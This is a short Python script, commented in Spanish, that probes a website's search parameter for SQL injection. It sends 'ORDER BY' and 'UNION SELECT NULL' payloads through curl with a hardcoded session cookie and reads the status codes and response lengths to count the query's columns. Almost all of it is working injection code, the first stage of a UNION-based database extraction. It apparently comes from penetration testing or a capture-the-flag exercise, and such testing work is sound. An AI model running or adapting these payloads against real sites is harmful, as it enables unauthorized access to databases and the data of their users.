#!/usr/bin/env python3
"""Determina el número de columnas del SELECT del buscador (ORDER BY / UNION)."""
import re
import subprocess
import urllib.parse

COOKIE = "trama_session=Vgb10FPCRELz_F_vMBbmZuRHczUjV3V1DKFygYKh22mTBZdgeA-3Qsy5Sgd3RSKU"
BASE = "https://<host>"


def probar(q: str) -> tuple[int, int, str]:
    url = f"{BASE}/buscar?q={urllib.parse.quote(q)}"
    r = subprocess.run(["curl", "-s", "-m", "20", "-b", COOKIE, "-w", "\n__C__%{http_code}", url],
                       capture_output=True, text=True)
    cuerpo, _, code = r.stdout.rpartition("__C__")
    return int(code), len(cuerpo), cuerpo


print("=== ORDER BY ===")
for n in range(1, 12):
    code, ln, _ = probar(f"' ORDER BY {n}-- -")
    print(f"  ORDER BY {n:2d} -> {code} ({ln})")
    if code != 200:
        break

print("\n=== UNION SELECT NULL x N ===")
for n in range(1, 12):
    q = "' UNION SELECT " + ",".join(["NULL"] * n) + "-- -"
    code, ln, _ = probar(q)
    print(f"  {n} columnas -> {code} ({ln})")
